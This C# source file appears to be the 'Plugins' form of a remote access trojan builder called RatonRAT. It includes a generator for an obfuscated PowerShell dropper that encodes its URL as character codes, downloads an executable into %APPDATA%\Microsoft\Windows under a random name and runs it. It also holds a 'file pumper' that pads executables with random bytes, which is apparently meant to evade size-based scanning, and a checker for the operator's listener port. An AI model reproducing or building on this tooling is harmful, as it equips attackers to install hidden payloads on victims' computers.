using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using SillyRAT;
using System.Threading.Tasks;

namespace RatonRAT
{
    public partial class Plugins : Form
    {
        public Plugins()
        {
            InitializeComponent();
        }

        private void Plugins_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 10));

        }
        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void Plugins_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 10));
                }
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            RatonRAT.Classes.RP.clickButton(button6);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable|*.exe";
                openFileDialog.Title = "Select an EXE file";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    Server.Classes.SFX.click();
                    RatonRAT.Classes.RP.clickButton(button1);
                    string selectedFile = openFileDialog.FileName;
                    label2.Text = selectedFile;
                    label2.ForeColor = Color.LimeGreen;
                    MessageBox.Show("File loaded to the file pumper", "File Selected", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            int megabytesToAdd = (int)numericUpDown1.Value;
            int bytesToAdd = megabytesToAdd * 1024 * 1024;

            byte[] junkCode = new byte[bytesToAdd];
            new Random().NextBytes(junkCode);

            byte[] originalExe = File.ReadAllBytes(label2.Text);

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Executable Files|*.exe";
                saveFileDialog.Title = "File pumper";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    using (FileStream fs = new FileStream(saveFileDialog.FileName, FileMode.Create))
                    {
                        fs.Write(originalExe, 0, originalExe.Length);
                        fs.Write(junkCode, 0, junkCode.Length);
                    }
                    MessageBox.Show("File saved with the new size", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            string url = textBox1.Text;
            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show("Please insert a valid direct download", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string encodedUrl = encode(url);
            string script = genpower(encodedUrl);
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "PowerShell (*.ps1)|*.ps1",
                Title = "Save your downloader",
                FileName = "Raton_downloader.ps1"
            };

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(saveFileDialog.FileName, script);
                MessageBox.Show("Powershell downloader saved", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        private string encode(string input)
        {
            StringBuilder encoded = new StringBuilder();
            foreach (char c in input)
            {
                encoded.Append($"([char]{(int)c})+");
            }
            return encoded.ToString().TrimEnd('+');
        }
        private string genpower(string encodedUrl)
        {
            return $@"
$URL = {encodedUrl}
$Output = ""$env:APPDATA\Microsoft\Windows\{Stuff.Helpers.Random(10)}.exe""
Invoke-WebRequest -Uri $URL -OutFile $Output
Start-Process -FilePath $Output -NoNewWindow";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (int.TryParse(textBox2.Text, out int port))
            {
                using (TcpClient tcpClient = new TcpClient())
                {
                    try
                    {
                        string ip = Program.form2.label6.Text.Replace("IP: ", "").Trim();
                        if(ip == "Hidden")
                        {
                            MessageBox.Show($"We can't check a hidden IP, please unhide it", "Result", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            button5.Text = "Check";
                            return;
                        }
                        this.Hide();
                        button5.Text = "Wait...";
                        _ = Task.Run(() =>
                        {
                            MessageBox.Show("Please wait while we check your network", "Port checker", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        });

                        tcpClient.Connect(ip, port);
                        button5.Text = "Check";
                        this.Show();
                        MessageBox.Show($"Port {port} opened in your network, enjoy!", "Result", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (SocketException)
                    {
                        this.Show();
                        button5.Text = "Check";
                        MessageBox.Show($"Port {port} closed in your network", "Result", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
            else
            {
                MessageBox.Show("Please enter a valid port", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

    }
}
